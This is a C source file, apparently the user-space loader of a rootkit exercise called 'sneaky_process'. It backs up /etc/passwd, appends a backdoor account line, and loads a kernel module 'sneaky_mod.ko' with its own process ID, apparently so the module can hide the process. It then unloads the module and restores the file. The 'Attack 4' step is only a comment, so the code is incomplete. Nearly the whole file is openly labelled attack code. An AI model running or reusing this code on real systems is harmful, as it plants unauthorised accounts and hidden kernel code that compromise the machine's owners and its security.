#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define DEBUG 1 // 1 to print debug info
#define SOURCEFILE "/etc/passwd"
#define TARGETFILE "/tmp/passwd"

void copyFile(const char *src, const char *trg);

void updateFile();

void loadModule();

void unloadModule();

int main(int argc, char **argv) {
  // Attack 1: print own process ID
  printf("sneaky_process pid = %d\n", getpid());

  // Attack 2: step 1 - copy from source to target
  copyFile(SOURCEFILE, TARGETFILE);

  if (DEBUG)
    printf("File copied successfully.\n");

  // Attack 2: step 2 - update source file
  updateFile();

  if (DEBUG)
    printf("Update file successfully...\n");

  // Attack 3: get process ID, load sneaky_mod.ko and pass PID
  loadModule();

  if (DEBUG)
    printf("Sneaky_mod loaded successfully.\n");

  // Attack 4: enter waiting loop, fork child process

  // finish step 1: rmmod
  unloadModule();

  // finish step 2: restore /etc/passwd
  copyFile(TARGETFILE, SOURCEFILE);

  return 0;
}

void copyFile(const char *src, const char *trg) {
  FILE *source, *target;
  source = fopen(src, "r");
  if (source == NULL) {
    printf("Cannot open source file...\n");
    exit(EXIT_FAILURE);
  }

  target = fopen(trg, "w");
  if (target == NULL) {
    fclose(source);
    printf("Cannot open target file...\n");
    exit(EXIT_FAILURE);
  }

  char ch;
  while ((ch = fgetc(source)) != EOF) {
    fputc(ch, target);
  }

  fclose(source);
  fclose(target);
}

void updateFile() {
  FILE *update;
  update = fopen(SOURCEFILE, "a");
  if (update == NULL) {
    printf("Cannot open update file...\n");
    exit(EXIT_FAILURE);
  }

  char newline[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
  int pos = 0;
  while (newline[pos] != '\0') {
    fputc(newline[pos], update);
    pos++;
  }

  fclose(update);
}

void loadModule() {
  pid_t pid = getpid();
  char command[80];
  sprintf(command, "insmod ./sneaky_mod.ko pid=%d", pid);
  if (system(command) < 0) {
    printf("Error in insmod...\n");
    exit(EXIT_FAILURE);
  }
}

void unloadModule() {
  if (system("rmmod ./sneaky_mod.ko") < 0) {
    printf("Error in rmmod...\n");
    exit(EXIT_FAILURE);
  }
}
